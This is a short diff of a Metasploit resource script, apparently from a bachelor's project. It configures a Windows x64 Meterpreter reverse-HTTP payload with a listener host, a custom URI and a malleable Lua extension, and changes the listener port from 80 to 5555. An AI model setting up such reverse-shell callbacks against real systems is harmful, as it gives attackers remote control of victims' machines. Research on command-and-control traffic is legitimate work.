@@ -2,7 +2,9 @@
  setg LHOST 192.168.42.131
 
  use payload/windows/x64/meterpreter_reverse_http
- set LPORT 80
+ 
+ set LPORT 5555
+
  setg luri mysuperduperpath
  set OverrideRequestHost true
  set EXTINIT malleable,/home/timo/Projects/bachelor/malleableScript.lua
